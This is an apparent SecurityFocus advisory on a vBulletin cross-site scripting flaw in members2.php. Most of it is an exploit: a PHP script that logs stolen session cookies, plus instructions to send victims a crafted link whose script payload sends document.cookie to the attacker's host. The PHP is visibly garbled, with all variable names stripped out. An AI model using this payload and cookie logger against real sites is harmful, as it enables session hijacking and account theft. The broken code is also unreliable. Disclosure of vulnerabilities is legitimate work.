source: http://www.securityfocus.com/bid/6246/info

Due to insufficient sanitization of user supplied values, it is possible to exploit a vulnerability in VBulletin. By passing an invalid value to a variable located in 'members2.php', it is possible to generate an error page which will include attacker-supplied HTML code which will be executed in a legitimate users browser.

This issue may be exploited to steal cookie-based authentication credentials from legitimate users of the website running the vulnerable software. The attacker may use cookie-based authentication credentials to hijack the session of the legitimate user.

    - Run this script on some host:

    <?PHP

      // vBulletin XSS Injection Vulnerability: Exploit
      // ---
      // Coded By  : Sp.IC (SpeedICNet@Hotmail.Com).
      // Descrption: Fetching vBulletin's cookies and storing it into a
log file.

      // Variables:

       = "Cookies.Log";

      // Functions:

      /*

      If (['Action'] = "Log") {

           = "<!--";
           = "--->";

      }
      Else {

            = "";
            = "";

      }

      Print ();

      */

      Print ("<Title>vBulletin XSS Injection Vulnerability:
Exploit</Title>");
      Print ("<Pre>");
      Print ("<Center>");
      Print ("<B>vBulletin XSS Injection Vulnerability: Exploit</B>\n");
      Print ("Coded By: <B><A
Href=\"MailTo:SpeedICNet@Hotmail.Com\">Sp.IC</A></B><Hr Width=\"20%\">");

      /*

      Print ();

      */

      Switch (['Action']) {

          Case "Log":

                  = ['Cookie'];

                  = StrStr (, SubStr (, BCAdd (0x0D,
StrLen (DecHex (MD5 (NULL))))));

                   = FOpen  (, "a+");
                         FWrite (, Trim () . "\n");
                         FClose ();

                         Print   ("<Meta HTTP-Equiv=\"Refresh\"
Content=\"0; URL=" . ['HTTP_REFERER'] . "\">");

          Break;

          Case "List":

                 If (!File_Exists () || !In_Array ()) {

                     Print ("<Br><Br><B>There are No
Records</B></Center></Pre>");

                     Exit  ();

                 }
                 Else {

                     Print ("</Center></Pre>");

                      = Array_UniQue (File ());

                     Print ("<Pre>");

                     Print ("<B>.:: Statics</B>\n");
                     Print ("\n");

                     Print ("^ Logged Records : <B>" . Count (File
()) . "</B>\n");
                     Print ("^ Listed Records : <B>" . Count

() . " </B>[Not Counting Duplicates]\n");
                     Print ("\n");

                     Print ("<B>.:: Options</B>\n");
                     Print ("\n");

                     If (Count (File ()) > 0) {

                         ['Download'] = "[<A Href=\"" .
 . "\">Download</A>]";

                     }
                     Else{

                         ['Download'] = "[No Records in Log]";

                     }

                     Print ("^ Download Log   : " . 
['Download'] . "\n");
                     Print ("^ Clear Records  : [<A Href=\"" .
 . "?Action=Delete\">Y</A>]\n");
                     Print ("\n");

                     Print ("<B>.:: Records</B>\n");
                     Print ("\n");

                     While (List ([0], [1]) = Each ()) {

                         Print ("<B>" . [0] . ": </B>" . [1]);

                     }

                 }

                 Print ("</Pre>");

          Break;

          Case "Delete":

              @UnLink ();

              Print   ("<Br><Br><B>Deleted
Succsesfuly</B></Center></Pre>") Or Die ("<Br><Br><B>Error: Cannot Delete
Log</B></Center></Pre>");

              Print   ("<Meta HTTP-Equiv=\"Refresh\" Content=\"3; URL=" .
['HTTP_REFERER'] . "\">");

          Break;

      }

    ?>
    - Give a victim this link: member2.php?s=[Session]
&action=viewsubscription&perpage=[Script Code]

    - Note: You can replace [Script Code] with: --
><Script>location='Http://[Exploit Path]?Action=Log&Cookie='+
(document.cookie);</Script>

    - Then go to Http://[Exploit Path]?Action=List